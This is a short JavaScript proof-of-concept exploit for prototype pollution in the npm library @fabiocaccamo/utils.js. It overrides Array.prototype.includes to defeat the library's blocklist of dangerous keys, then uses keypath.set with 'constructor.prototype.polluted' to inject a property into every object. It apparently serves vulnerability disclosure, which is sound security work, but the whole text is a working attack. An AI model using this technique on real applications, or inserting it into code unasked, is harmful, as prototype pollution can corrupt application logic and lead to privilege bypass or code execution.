Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const utils = require('@fabiocaccamo/utils.js');
const obj = {};
console.log({}.polluted);
utils.object.keypath.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);